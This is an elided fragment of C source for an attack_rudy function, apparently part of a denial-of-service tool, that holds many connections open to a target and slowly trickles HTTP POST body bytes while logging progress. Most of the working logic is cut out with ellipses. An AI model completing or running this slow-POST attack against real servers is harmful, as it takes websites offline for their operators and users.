...
void *attack_rudy(void *arg) {
  ...
  log_info("Starting R.U.D.Y attack on %s:%d", inet_ntoa(target->sin_addr),
           ntohs(target->sin_port));

  rudy_connection_t *connections =
      calloc(RUDY_MAX_CONNECTIONS, sizeof(rudy_connection_t));
    ...
    for (size_t i = 0; i < RUDY_MAX_CONNECTIONS; i++) {
      ...
      if (!connections[i].header_sent) {
        ...
        snprintf(header, sizeof(header),
                 ...
                 "\r\n",
                 inet_ntoa(target->sin_addr), RUDY_POST_SIZE);
        ...
        if (connections[i].bytes_sent < RUDY_POST_SIZE) {
          ...
          if (sent > 0) {
            ...
            if (connections[i].bytes_sent % 100 == 0) {
              log_debug("RUDY: fd %d sent %zu/%d bytes", connections[i].fd,
                        connections[i].bytes_sent, RUDY_POST_SIZE);
            }
          } else {
            // Connection died
            close(connections[i].fd);
